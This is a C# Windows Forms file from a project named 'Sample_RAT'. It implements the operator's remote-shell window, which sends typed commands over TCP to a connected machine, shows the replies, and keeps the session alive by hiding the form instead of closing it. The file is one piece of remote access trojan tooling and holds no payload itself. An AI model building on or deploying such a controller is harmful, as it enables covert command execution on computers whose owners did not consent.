using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sample_RAT
{
    public partial class winShell : Form
    {
        TcpClient Client;
        public winShell(winMain winMain, TcpClient client)
        {
            Client = client;
            InitializeComponent();
        }

        public string IP { get; set; }
        public bool isRun { get; set; }
        private string _recivedText;

        public string RecivedText
        {
            get { return _recivedText; }
            set { _recivedText = value; textBox1.AppendText(value); textBox1.AppendText(Environment.NewLine); }
        }

        private void textBox2_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == 13)
            {
                byte[] buff = Encoding.ASCII.GetBytes(textBox2.Text.Trim() + "\r\n");
                Client.Client.Send(buff);
                textBox2.Clear();
            }
        }
        private void winShell_Load(object sender, EventArgs e)
        {
            this.Text += " : " + IP;
        }
        private void winShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (isRun)
            {
                e.Cancel = true;
                this.Hide();
            }
            else
            {
                e.Cancel = false;
            }
        }
    }
}
